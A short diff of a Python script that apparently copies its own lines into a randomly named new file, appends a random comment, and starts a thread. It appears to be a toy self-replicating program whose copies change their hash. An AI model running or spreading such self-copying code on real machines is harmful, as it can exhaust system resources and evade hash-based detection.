@@ -24,7 +24,12 @@ lines = f.readlines()
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
 g = open(filename, "w")
+count = len(lines)
+start = 0 
 for line in lines:
+    start = start + 1
+    if start == (count - 1):
+        break
     g.write(line)
 
 g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
@@ -36,5 +41,3 @@ def runFunc():
 
 thread = Thread(target=runFunc)
 thread.start()
-print("yep I am here" + filename)
-sys.exit()
